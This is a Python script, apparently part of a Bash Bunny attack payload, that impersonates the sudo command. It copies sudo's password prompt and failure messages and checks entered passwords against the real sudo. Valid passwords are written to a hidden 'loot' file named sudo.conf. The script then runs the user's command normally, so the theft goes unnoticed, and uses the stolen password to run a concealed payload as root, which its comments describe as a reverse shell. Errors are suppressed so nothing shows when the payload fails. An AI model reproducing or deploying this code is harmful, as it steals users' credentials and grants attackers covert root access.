#!/usr/bin/env python

realSudo = "REAL_SUDO_HERE"
pythonInterpreter = "PYTHON_EXECUTABLE_GOES_HERE"

def cantLoadModuleError():
    import sys
    if sys.version_info.major < 3:
        return ImportError
    if sys.version_info.minor < 6:
        return ImportError
    else:
        return ModuleNotFoundError

def getLootFileName():
    import os
    thisFullPath = os.path.abspath(__file__)
    thisDirectory = os.path.split(thisFullPath)[0]
    lootFile = thisDirectory + os.sep + "sudo.conf"
    return os.path.join(lootFile)

def initializeThisScript():
    '''This function will be run the first time by the bunny'''
    import subprocess
    import re        
    pathFinder = subprocess.Popen("which python".split(), stdout = subprocess.PIPE)
    pythonExecutable = pathFinder.stdout.read().strip()
    pathFinder = subprocess.Popen("which sudo".split(), stdout = subprocess.PIPE)
    sudoExecutable = pathFinder.stdout.read().strip()
    try:
        import json
    except cantLoadModuleError():
        try:
            jsonInstaller = subprocess.Popen("pip install --user json".split(), stdout = subprocess.PIPE, stderr = subprocess.PIPE)
            jsonInstaller = subprocess.Popen("pip3 install --user json".split(), stdout = subprocess.PIPE, stderr = subprocess.PIPE)
        except:
            pass
    try:
        import getpass
    except:
        try:
            getPassInstaller = subprocess.Popen("pip install --user getpass".split(), stdout = subprocess.PIPE, stderr = subprocess.PIPE)
        except:
            pass
    thisFileName = __file__
    thisFile = open(thisFileName, 'r')
    originalCode = thisFile.read()
    thisFile.close()
    newCode = re.sub("PYTHON_EXECUTABLE_GOES_HERE", pythonExecutable, originalCode, 1)
    newCode = re.sub("REAL_SUDO_HERE", sudoExecutable, newCode, 1)
    thisFile = open(thisFileName, 'w')
    thisFile.write(newCode)
    thisFile.close()
    createLootFile(getLootFileName())
    silencePayloadFile()
    quit()
    
def createLootFile(lootFileName):
    import json
    initialData = {}
    lootFile = open(lootFileName, 'w')
    json.dump(initialData, lootFile)
    lootFile.close()

def validSudoPassword(password):
    import subprocess
    command = [realSudo, "-S", "-b", "echo", "Echo this"]
    wrapper = subprocess.Popen(command, stdin = subprocess.PIPE, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
    wrapper.communicate(password + "\n")
    return not wrapper.returncode

def getPayloadFile():
    import os
    programDirectory = os.path.split(__file__)[0]
    return programDirectory + os.sep + ".sudo"

def silencePayloadFile():  #if there is an error making our reverse https, such as a bad network connection, this will make it fail without any output
    import os
    payloadFileName = getPayloadFile()
    if os.path.isfile(payloadFileName):
        payloadFile = open(payloadFileName, 'r')
        payload = payloadFile.read()
        payloadFile.close()
        payload = "try:\n\t" + payload + "\nexcept:\n\tpass"
        payloadFile = open(payloadFileName, 'w')
        payloadFile.write(payload)
        payloadFile.close()

def blueTurtleShell(password):
    import subprocess
    import os
    payloadFile = getPayloadFile()
    if not os.path.isfile(payloadFile):
        return False
    command = " ".join([realSudo, "-S", "-b", pythonInterpreter, payloadFile])
    hackTheGibson = subprocess.Popen(command, stdin = subprocess.PIPE, shell = True)
    hackTheGibson.communicate(password + "\n")

def runIntendedSudoCommand(validatedSudoPassword):
    import sys
    import subprocess
    args = sys.argv[1:]
    for index, arg in enumerate(args):
        if arg == "sudo":
            args[index] = realSudo
    command = " ".join([realSudo, "-S"] + args)
    runner = subprocess.Popen(command, stdin = subprocess.PIPE, shell = True)
    runner.communicate(validatedSudoPassword + "\n")
    
def getSudoPassword(allowedAttempts = 3):
    import getpass
    user = getpass.getuser()
    if validSudoPassword(""):  #this avoids having the program ask for a password if a valid one was just entered (normal sudo behavior).  Also avoids creating a bunch of reverse shells if the user is repeatedly using sudo (that could create some noise on both ends)
        return (user, "", False)
    prompt = "[sudo] password for %s: " %user
    fail = "Sorry, try again."
    epicFail = "sudo: %s incorrect password attempts" %allowedAttempts
    success = False
    for i in range(allowedAttempts):
        password = getpass.getpass(prompt)
        if validSudoPassword(password):
            success = True
            break
        else:
            if not i == allowedAttempts - 1:
                print(fail)
    if not success:
        print(epicFail)
        quit()
    return (user, password, True)

def loadLootFile(lootFileName):
    import json
    try:
       file = open(lootFileName, 'r')
       data = json.load(file)
       file.close()
       return data
    except:
        return False
    
def saveLootFile(loot, lootFileName):
    import json
    try:
        file = open(lootFileName, 'w')
        json.dump(loot, file)
        file.close()
    except:
        pass
    
def parseArguments():
    import sys
    argList = sys.argv
    if "--initializeScript" in sys.argv:
        initializeThisScript()
    else:
        return argList

if __name__ == '__main__':
    try:
        parseArguments()
        lootFile = getLootFileName()
        loot = loadLootFile(lootFile)
        user, password, passwordNeeded = getSudoPassword()
        if passwordNeeded:
            loot[user] = password
        saveLootFile(loot, lootFile)
    except:
        pass
    runIntendedSudoCommand(password)
    try:
        if not passwordNeeded:
            try:
                password = loot[user]
            except:
                pass
        blueTurtleShell(password)
    except:
        pass    